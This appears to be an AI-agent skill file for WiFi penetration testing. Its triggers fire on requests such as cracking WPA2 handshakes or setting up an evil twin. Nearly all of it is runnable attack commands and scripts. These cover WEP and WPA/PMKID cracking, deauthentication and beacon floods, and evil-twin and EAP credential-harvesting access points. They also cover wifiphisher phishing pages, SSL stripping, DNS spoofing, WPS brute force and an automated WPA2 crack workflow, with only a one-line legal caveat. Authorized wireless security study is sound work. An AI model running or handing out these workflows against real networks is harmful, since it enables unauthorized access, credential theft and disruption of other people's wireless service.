---
name: wireless-security-wifi-penetration-testing
description: Comprehensive wireless security and WiFi penetration testing knowledge base covering 802.11, WEP/WPA/WPA2/WPA3, aircrack-ng suite, and ethical hacking techniques
triggers:
  - how do I crack WPA2 handshakes
  - show me how to put wireless adapter in monitor mode
  - help me capture WiFi packets with aircrack-ng
  - how to perform WEP cracking
  - setup evil twin access point attack
  - enumerate hidden SSIDs and wireless networks
  - perform deauthentication attack on WiFi
  - crack WPA3 or PMKID hashes
---

# Wireless Security & WiFi Penetration Testing Skill

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides comprehensive knowledge for wireless security assessment and WiFi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 protocol fundamentals, encryption protocols (WEP/WPA/WPA2/WPA3), monitor mode configuration, packet capture, traffic analysis, and various attack vectors including handshake capture, key cracking, rogue access points, and enterprise wireless assessment.

## Project Overview

**Wireless Security & WiFi Penetration Testing** is an open, hands-on study curriculum covering wireless security assessment from fundamentals to advanced enterprise attacks. It teaches practical skills for authorized wireless penetration testing using Kali Linux and injection-capable wireless adapters.

**Key Capabilities:**
- 802.11 protocol analysis and frame inspection
- WEP/WPA/WPA2/WPA3 encryption attack techniques
- Monitor mode and packet injection
- Wireless reconnaissance and SSID enumeration
- Handshake capture and offline cracking
- Rogue access point and evil twin attacks
- Enterprise WPA (EAP/RADIUS) assessment
- Wireless denial-of-service testing
- PMKID and WPS attacks

**Legal Warning:** All techniques are for authorized testing only. Wireless attacks against networks without explicit written permission are illegal in most jurisdictions.

## Prerequisites

**Hardware Requirements:**
- Injection-capable wireless adapter (Atheros AR9271, Ralink RT3070/RT5372)
- Test access point you own/control
- Client devices for testing
- Kali Linux (bare-metal recommended for timing-sensitive attacks)

**Software Requirements:**
- Kali Linux (most tools pre-installed)
- aircrack-ng suite
- hashcat for GPU cracking
- wireshark for traffic analysis
- hostapd for rogue AP attacks

**Verify adapter injection capability:**
```bash
# Check wireless interfaces
iwconfig

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode
iwconfig

# Test injection capability
sudo aireplay-ng --test wlan0mon

# Expected output should show injection working
# If "Injection is working!" appears, adapter is suitable
```

## Installation & Setup

### Kali Linux Tool Installation

Most tools are pre-installed on Kali. Install missing components:

```bash
# Update package lists
sudo apt update

# Core wireless tools (usually pre-installed)
sudo apt install -y aircrack-ng

# Additional cracking and analysis tools
sudo apt install -y hashcat hcxtools hcxdumptool wireshark

# WPS attack tools
sudo apt install -y reaver bully

# Rogue AP and MITM tools
sudo apt install -y hostapd dnsmasq wifiphisher

# Wireless IDS
sudo apt install -y kismet

# Traffic manipulation
sudo apt install -y bettercap
```

### Wireless Adapter Configuration

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor interface created (usually wlan0mon)
iwconfig

# Set regulatory domain (replace US with your country code)
sudo iw reg set US

# Verify current regulatory domain
sudo iw reg get

# Manually set monitor mode (alternative method)
sudo ip link set wlan0 down
sudo iw dev wlan0 set monitor control
sudo ip link set wlan0 up

# Set specific channel (e.g., channel 6)
sudo iwconfig wlan0mon channel 6
```

## Core Commands & Workflows

### 1. Wireless Reconnaissance

**Discover all wireless networks:**

```bash
# Start monitoring all channels
sudo airodump-ng wlan0mon

# Monitor specific channel (e.g., channel 6)
sudo airodump-ng --channel 6 wlan0mon

# Monitor specific band (2.4GHz)
sudo airodump-ng --band bg wlan0mon

# Monitor 5GHz band
sudo airodump-ng --band a wlan0mon

# Write captures to file
sudo airodump-ng --write capture --output-format pcap wlan0mon
```

**Target specific network:**

```bash
# Focus on specific BSSID and channel
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write target wlan0mon

# Show only clients (stations)
sudo airodump-ng --channel 6 -d 00:11:22:33:44:55 wlan0mon
```

**Enumerate hidden SSIDs:**

```bash
# Capture on channel, wait for probe requests
sudo airodump-ng --channel 6 --write hidden wlan0mon

# Force deauth to trigger SSID broadcast in reassociation
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon
```

### 2. WEP Cracking

**Fake authentication attack:**

```bash
# Associate with WEP AP
sudo aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# -a = target AP BSSID
# -h = your adapter MAC (find with: macchanger -s wlan0mon)
```

**ARP replay attack (IV collection):**

```bash
# Terminal 1: Capture traffic
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write wep-crack wlan0mon

# Terminal 2: ARP replay to generate IVs
sudo aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Monitor IV count in airodump-ng (need ~50,000+ for WEP-64, ~100,000+ for WEP-128)
```

**Crack WEP key:**

```bash
# Crack using captured IVs
sudo aircrack-ng wep-crack-01.cap

# Specify WEP key length
sudo aircrack-ng -n 64 wep-crack-01.cap   # 64-bit WEP
sudo aircrack-ng -n 128 wep-crack-01.cap  # 128-bit WEP

# Use multiple capture files
sudo aircrack-ng wep-crack-*.cap
```

**Chop-Chop attack (when ARP replay fails):**

```bash
# Perform chop-chop to decrypt packet
sudo aireplay-ng --chopchop -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Create ARP packet from decrypted data
sudo packetforge-ng --arp -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.1 -l 192.168.1.100 -y fragment-*.xor -w arp-packet

# Inject crafted packet
sudo aireplay-ng --interactive -r arp-packet wlan0mon
```

### 3. WPA/WPA2 Handshake Capture & Cracking

**Capture WPA handshake:**

```bash
# Terminal 1: Start capture on target
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write wpa-handshake wlan0mon

# Terminal 2: Deauth client to force re-authentication
sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c CC:DD:EE:FF:00:11 wlan0mon

# -a = AP BSSID
# -c = client MAC (optional, targets specific client)
# --deauth 10 = send 10 deauth packets

# Watch airodump-ng for "WPA handshake: 00:11:22:33:44:55" in top-right
```

**Verify handshake capture:**

```bash
# Check if handshake is valid
sudo aircrack-ng wpa-handshake-01.cap

# Should display: "1 handshake" if successful
```

**Crack WPA/WPA2 with wordlist:**

```bash
# Dictionary attack using rockyou
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 wpa-handshake-01.cap

# Use custom wordlist
sudo aircrack-ng -w /path/to/custom-wordlist.txt wpa-handshake-01.cap

# Specify ESSID
sudo aircrack-ng -w wordlist.txt -e "NetworkName" wpa-handshake-01.cap
```

**GPU cracking with hashcat:**

```bash
# Convert capture to hashcat format
sudo aircrack-ng wpa-handshake-01.cap -J wpa-handshake

# This creates wpa-handshake.hccapx or wpa-handshake.hc22000 (newer format)

# Or use hcxpcapngtool for newer captures
hcxpcapngtool -o wpa-hash.hc22000 wpa-handshake-01.cap

# Crack with hashcat (mode 22000 for WPA/WPA2)
hashcat -m 22000 -a 0 wpa-hash.hc22000 /usr/share/wordlists/rockyou.txt

# GPU-accelerated with performance tuning
hashcat -m 22000 -a 0 -w 3 -O wpa-hash.hc22000 wordlist.txt

# Mask attack (8-digit numeric password)
hashcat -m 22000 -a 3 wpa-hash.hc22000 ?d?d?d?d?d?d?d?d

# Show cracked passwords
hashcat -m 22000 wpa-hash.hc22000 --show
```

### 4. PMKID Attack (Clientless WPA/WPA2)

**Capture PMKID:**

```bash
# Capture PMKID using hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid-capture.pcapng --enable_status=1

# Target specific BSSID
sudo hcxdumptool -i wlan0mon -o pmkid-capture.pcapng --filterlist=targets.txt --filtermode=2

# targets.txt contains one BSSID per line:
# 00:11:22:33:44:55

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid-capture.pcapng

# Verify PMKID captured
hcxpcapngtool --pmkid=pmkid.hc22000 pmkid-capture.pcapng
```

**Crack PMKID:**

```bash
# Crack with hashcat (same mode as handshake)
hashcat -m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Combination attack
hashcat -m 22000 -a 1 pmkid.hc22000 wordlist1.txt wordlist2.txt

# Show results
hashcat -m 22000 pmkid.hc22000 --show
```

### 5. Evil Twin / Rogue Access Point

**Basic evil twin with hostapd:**

```bash
# Create hostapd configuration (evil-twin.conf)
cat > evil-twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Stop network manager
sudo systemctl stop NetworkManager

# Start rogue AP
sudo hostapd evil-twin.conf
```

**Evil twin with DHCP and internet sharing:**

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure dnsmasq for DHCP
cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,8h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
EOF

# Assign IP to rogue AP interface
sudo ip addr add 192.168.10.1/24 dev wlan0

# Start DHCP server
sudo dnsmasq -C dnsmasq.conf -d

# Terminal 2: Start hostapd
sudo hostapd evil-twin.conf

# Terminal 3: Setup NAT (if sharing internet from eth0)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

**Automated evil twin with wifiphisher:**

```bash
# Install wifiphisher
sudo apt install -y wifiphisher

# Launch evil twin attack (automatic)
sudo wifiphisher -i wlan0 -e "TargetNetwork"

# Use specific phishing scenario
sudo wifiphisher -i wlan0 -e "TargetNetwork" -p firmware-upgrade

# Deauth target and create twin
sudo wifiphisher -aI wlan0 -e "TargetNetwork" -p oauth-login
```

### 6. Wireless MITM & Traffic Capture

**Capture traffic on rogue AP:**

```bash
# Start tcpdump on AP interface
sudo tcpdump -i wlan0 -w evil-twin-traffic.pcap

# Filter HTTP traffic only
sudo tcpdump -i wlan0 -w http-traffic.pcap 'tcp port 80'

# Real-time display of HTTP requests
sudo tcpdump -i wlan0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

**SSL stripping with bettercap:**

```bash
# Start bettercap
sudo bettercap -iface wlan0

# In bettercap console:
# Enable HTTP/HTTPS proxy
set http.proxy.sslstrip true
http.proxy on

# Capture credentials
set net.sniff.verbose true
net.sniff on

# DNS spoofing
set dns.spoof.domains example.com
dns.spoof on
```

### 7. WPS Attack

**Enumerate WPS-enabled networks:**

```bash
# Scan for WPS
sudo wash -i wlan0mon

# Scan specific channel
sudo wash -i wlan0mon -c 6
```

**WPS PIN brute force with reaver:**

```bash
# Attack WPS-enabled AP
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

# Aggressive mode (faster but more detectable)
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -d 0 -T 0.5 -r 5:3

# Resume previous session
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -s /tmp/reaver.session

# Pixie dust attack (if vulnerable)
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K
```

**WPS attack with bully:**

```bash
# Standard WPS attack
sudo bully -b 00:11:22:33:44:55 -c 6 wlan0mon

# Pixie dust
sudo bully -b 00:11:22:33:44:55 -c 6 -d wlan0mon

# Verbose output
sudo bully -b 00:11:22:33:44:55 -c 6 -v 3 wlan0mon
```

### 8. Enterprise WPA (EAP/RADIUS) Assessment

**Enumerate EAP methods:**

```bash
# Use eaphammer to fingerprint
cd /opt/eaphammer
./eaphammer -i wlan0 --creds --negotiate balanced -e "EnterpriseWiFi"

# Passive enumeration with airodump
sudo airodump-ng wlan0mon --essid "EnterpriseWiFi" --write enterprise-capture
```

**Evil twin for EAP credential harvesting:**

```bash
# Configure hostapd for WPA-Enterprise
cat > enterprise-evil-twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=EnterpriseWiFi
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd/hostapd.eap_user
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server.key
EOF

# Create eap_user file (accept any credentials)
cat > /etc/hostapd/hostapd.eap_user << 'EOF'
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS-MSCHAPV2 "t" [2]
EOF

# Start evil twin to harvest credentials
sudo hostapd enterprise-evil-twin.conf -dd
```

**Using eaphammer for automated assessment:**

```bash
# Clone and install eaphammer
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
./kali-setup.sh

# Run credential harvester
./eaphammer --interface wlan0 --creds --negotiate balanced --essid "EnterpriseWiFi" --auth wpa-eap

# Targeted attack with certificate
./eaphammer -i wlan0 --creds --essid "EnterpriseWiFi" --auth wpa-eap --cert-wizard
```

### 9. Denial of Service Attacks

**Deauthentication flood:**

```bash
# Deauth all clients from AP
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon

# Deauth specific client
sudo aireplay-ng --deauth 0 -a 00:11:22:33:44:55 -c CC:DD:EE:FF:00:11 wlan0mon

# Send specific number of deauth packets
sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 wlan0mon
```

**Beacon flood:**

```bash
# Use mdk4 for beacon flooding
sudo mdk4 wlan0mon b -f target-ssids.txt -a -w n -s 1000

# Random SSID beacon flood
sudo mdk4 wlan0mon b -a -w n -s 1000

# Channel hopping beacon flood
sudo mdk4 wlan0mon b -c 1,6,11 -s 1000
```

**Authentication flood:**

```bash
# mdk4 authentication DoS
sudo mdk4 wlan0mon a -a 00:11:22:33:44:55 -m

# Michael countermeasure exploitation
sudo mdk4 wlan0mon m -t 00:11:22:33:44:55
```

## Configuration Patterns

### Wordlist Generation

```bash
# Generate custom wordlist with crunch
crunch 8 12 -t @@@@%%%% -o custom-wordlist.txt

# Generate based on company name
crunch 8 12 -t CompanyName@@@ -o company-wordlist.txt

# Generate with character set
crunch 8 8 0123456789abcdef -o hex-wordlist.txt

# Use cewl to scrape website for passwords
cewl -d 2 -m 5 https://target-company.com -w company-web-wordlist.txt
```

### MAC Address Spoofing

```bash
# Show current MAC
macchanger -s wlan0

# Change to random MAC
sudo macchanger -r wlan0

# Set specific MAC
sudo macchanger -m 00:11:22:33:44:55 wlan0

# Restore original MAC
sudo macchanger -p wlan0
```

### Monitor Multiple Channels

```bash
# Use kismet for multi-channel monitoring
sudo kismet -c wlan0mon

# Configure kismet to log to specific directory
sudo kismet -c wlan0mon -t "WirelessPentest" --log-prefix /tmp/kismet/

# Use airodump-ng with channel hopping (default)
sudo airodump-ng wlan0mon

# Lock to specific channels
sudo airodump-ng --channel 1,6,11 wlan0mon
```

## Traffic Analysis with Wireshark

**Filter 802.11 frames:**

```bash
# Open capture in Wireshark
wireshark wpa-handshake-01.cap

# Common Wireshark filters:
# WPA handshake packets
eapol

# Deauthentication frames
wlan.fc.type_subtype == 0x0c

# Beacon frames
wlan.fc.type_subtype == 0x08

# Probe requests
wlan.fc.type_subtype == 0x04

# Specific BSSID
wlan.bssid == 00:11:22:33:44:55

# Specific SSID
wlan.ssid == "NetworkName"

# Data frames only
wlan.fc.type == 2
```

**Extract credentials from capture:**

```bash
# Use tshark to extract EAPOL
tshark -r wpa-handshake-01.cap -Y eapol -V

# Extract HTTP credentials
tshark -r evil-twin-traffic.pcap -Y http.request -T fields -e http.host -e http.request.uri -e http.cookie

# Extract DNS queries
tshark -r traffic.pcap -Y dns.qry.name -T fields -e dns.qry.name | sort -u
```

## Common Patterns & Use Cases

### Complete WPA2 PSK Crack Workflow

```bash
#!/bin/bash
# Complete WPA2 cracking workflow

TARGET_BSSID="00:11:22:33:44:55"
TARGET_CHANNEL="6"
CAPTURE_FILE="wpa2-crack"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Start capture
sudo airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write $CAPTURE_FILE wlan0mon &
AIRODUMP_PID=$!

# 3. Wait for client to appear
echo "Waiting 30 seconds for client detection..."
sleep 30

# 4. Deauth to capture handshake
sudo aireplay-ng --deauth 10 -a $TARGET_BSSID wlan0mon

# 5. Wait for handshake
echo "Waiting 20 seconds for handshake capture..."
sleep 20

# 6. Stop capture
kill $AIRODUMP_PID

# 7. Verify handshake
if aircrack-ng "${CAPTURE_FILE}-01.cap" | grep -q "1 handshake"; then
    echo "Handshake captured successfully!"
    
    # 8. Convert for hashcat
    hcxpcapngtool -o wpa2-hash.hc22000 "${CAPTURE_FILE}-01.cap"
    
    # 9. Crack with hashcat
    hashcat -m 22000 -a 0 -w 3 wpa2-hash.hc22000 $WORDLIST
    
    # 10. Show result
    hashcat -m 22000 wpa2-hash.hc22000 --show
else
    echo "Handshake capture failed. Retry."
fi

# 11. Cleanup
sudo airmon-ng stop wlan0mon
```

### Automated Network Discovery & Logging

```bash
#!/bin/bash
# Comprehensive wireless survey

OUTPUT_DIR="wireless-survey-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

# Enable monitor mode
sudo airmon-ng start wlan0

# Capture 2.4GHz
sudo airodump-ng --band bg --write "$OUTPUT_DIR/2.4ghz" --output-format csv,pcap wlan0mon &
SURVEY_24_PID=$!

# Wait 5 minutes
echo "Surveying 2.4GHz for 5 minutes..."
sleep 300

# Stop 2.4GHz capture
kill $SURVEY_24_PID

# Capture 5GHz
sudo airodump-ng --band a --write "$OUTPUT_DIR/5ghz" --output-format csv,pcap wlan0mon &
SURVEY_5_PID=$!

# Wait 5 minutes
echo "Surveying 5GHz for 5 minutes..."
sleep 300

# Stop 5GHz capture
kill $SURVEY_5_PID

# Generate report
echo "=== Wireless Survey Report ===" > "$OUTPUT_DIR/report.txt"
echo "Date: $(date)" >> "$OUTPUT_DIR/report.txt"
echo "" >> "$OUTPUT_DIR/report.txt"

# Parse CSV for summary
awk -F',' 'NR>2 && $14!="" {print $14,$6,$9}' "$OUTPUT_DIR/2.4ghz-01.csv" | sort -u >> "$OUTPUT_DIR/report.txt"

# Cleanup
sudo airmon-ng stop wlan0mon

echo "Survey complete. Results in $OUTPUT_DIR/"
```

### Multi-Target PMKID Collection

```bash
#!/bin/bash
# Collect PMKIDs from multiple targets

TARGETS_FILE="targets.txt"  # One BSSID per line
OUTPUT_FILE="pmkid-collection.pcapng"
HASH_FILE="pmkid-hashes.hc22000"

# Enable monitor mode
sudo airmon-ng start wlan0

# Capture PMKIDs
sudo hcxdumptool -i wlan0mon -o $OUTPUT_FILE --filterlist=$TARGETS_FILE --filtermode=2 --enable_status=1

# Wait for collection (adjust timeout as needed)
echo "Collecting PMKIDs for 10 minutes..."
sleep 600

# Stop capture (Ctrl+C hcxdumptool manually or send signal)
# Convert to hashcat format
hcxpcapngtool -o $HASH_FILE $OUTPUT_FILE

# Count PMKIDs captured
PMKID_COUNT=$(grep -c "^WPA" $HASH_FILE)
echo "Captured $PMKID_COUNT PMKIDs"

# Crack with wordlist
hashcat -m 22000 -a 0 $HASH_FILE /usr/share/wordlists/rockyou.txt

# Show results
hashcat -m 22000 $HASH_FILE --show

# Cleanup
sudo airmon-ng stop wlan0mon
```

## Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Check if adapter supports monitor mode
iw list | grep -A 10 "Supported interface modes"

# Should show "monitor" in list

# Kill interfering processes
sudo airmon-ng check kill

# Manually set monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify
iwconfig wlan0
```

### Injection Not Working

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# If fails, check driver/firmware
dmesg | tail -20

# Ensure no conflicting processes
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Try different channel
sudo iwconfig wlan0mon channel 1
sudo aireplay-ng --test wlan0mon
```

### No Handshake Captured

```bash
# Verify client is connected
sudo airodump-ng --bssid 00:11:22:33:44:55 --channel 6 wlan0mon
# Check "Stations" section for connected clients

# Increase deauth packet count
sudo aireplay-ng --deauth 50 -a 00:11:22:33:44:55 wlan0mon

# Target specific client
sudo aireplay-ng --deauth 20 -a 00:11:22:33:44:55 -c CC:DD:EE:FF:00:11 wlan0mon

# Verify handshake in capture
sudo aircrack-ng capture-01.cap
# Should show "1 handshake"

# Check with tshark
tshark -r capture-01.cap -Y eapol
# Should see 4-way handshake frames
```

### WEP Cracking Not Generating IVs

```bash
# Ensure successful fake authentication first
sudo aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Look for "Authentication successful" message

# Try different replay attack
sudo aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# If no ARPs, try fragmentation attack
sudo aireplay-ng --fragment -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon

# Monitor IV count in airodump-ng
# Need steady increase in "#Data" column
```

### Hashcat Not Detecting GPU

```bash
# Check hashcat devices
hashcat -I

# Update GPU drivers
# For NVIDIA:
sudo apt install nvidia-driver nvidia-cuda-toolkit

# For AMD:
sudo apt install rocm-opencl-runtime

# Verify OpenCL
clinfo

# Force CPU-only mode if GPU unavailable
hashcat -m 22000 -a 0 -D 1 hash.hc22000 wordlist.txt
# -D 1 = CPU only
# -D 2 = GPU only
```

### Evil Twin Not Attracting Clients

```bash
# Ensure same SSID as target
# Increase signal strength by moving closer to clients
